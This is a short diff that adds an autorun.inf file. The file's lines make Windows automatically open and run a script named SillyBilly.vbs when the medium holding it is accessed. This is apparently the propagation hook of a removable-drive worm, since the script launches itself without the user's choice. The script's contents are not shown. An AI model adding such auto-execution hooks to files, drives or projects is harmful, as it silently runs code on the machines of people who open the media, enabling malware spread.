@@ -1,0 +1,3 @@
+[autorun]
+open=SillyBilly.vbs
+action=Run SillyBilly.vbs
